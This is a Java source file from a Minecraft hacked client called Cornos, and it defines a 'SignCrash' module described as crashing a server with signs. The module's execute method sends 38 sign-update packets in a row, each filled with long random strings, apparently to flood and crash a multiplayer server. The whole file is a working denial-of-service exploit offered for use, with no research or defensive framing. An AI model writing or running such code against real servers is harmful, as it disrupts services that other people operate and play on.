/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# Project: Cornos
# File: SignCrash
# Created by constantin at 07:15, MÃ¤r 18 2021
PLEASE READ THE COPYRIGHT NOTICE IN THE PROJECT ROOT, IF EXISTENT
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/
package me.zeroX150.cornos.features.module.impl.exploit.crash;

import java.util.Objects;

import me.zeroX150.cornos.Cornos;
import me.zeroX150.cornos.etc.helper.Rnd;
import me.zeroX150.cornos.features.module.Module;
import me.zeroX150.cornos.features.module.ModuleType;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;

public class SignCrash extends Module {
	public SignCrash() {
		super("SignCrash", "Crashes a server with signs lulw", ModuleType.CRASH);
	}

	@Override
	public void onExecute() {
		for (int i = 0; i < 38; i++) {
			assert Cornos.minecraft.player != null;
			UpdateSignC2SPacket p = new UpdateSignC2SPacket(Cornos.minecraft.player.getBlockPos(), Rnd.rndBinStr(598),
					Rnd.rndBinStr(598), Rnd.rndBinStr(598), Rnd.rndBinStr(598));
			Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(p);
		}
		super.onExecute();
	}
}
